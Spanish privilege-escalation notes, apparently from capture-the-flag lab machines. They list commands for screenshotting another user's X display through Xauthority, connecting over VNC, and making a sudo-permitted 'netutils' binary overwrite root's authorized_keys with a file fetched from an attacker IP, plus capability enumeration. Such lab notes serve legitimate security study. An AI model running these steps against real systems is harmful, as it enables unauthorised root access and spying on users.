# Escalada

# Escalada

## Abuso de Xauthority

### Listar sesiones activas

```
alex@squashed:/home/alex$ w
 15:06:33 up  8:45,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               06:21    8:45m 46.16s  0.06s /usr/libexec/gnome-session-binary --systemd --session=gnome
```

### Verificar la conexión

```
xdpyinfo -display <DISPLAY>
```

### Capturar pantalla

```
xwd -root -screen -silent -display <DISPLAY> > screenshot.xwd
```

### Conexión con vncviewer

```
proxychains vncviewer -passwd secret localhost:5901
```

## Abuso de binarios sudoers

## Netutils

Creación de enlace simbólico de mi clave pública a las authorized_keys de otro usuario

```
ln -s -f /root/.ssh/authorized_keys id_rsa.pub
```

```
aaron@timing:~$ sudo /usr/bin/netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.16.2/cmd.jpg
Initializing download: http://10.10.16.2/cmd.jpg
File size: 33 bytes
Opening output file cmd.jpg.0
Server unsupported, starting from scratch with one connection.
Starting download

Downloaded 33 byte in 0 seconds. (0.04 KB/s)
```

## Capabilities

### Enumeración

```
getcap -r / 2>/dev/null
```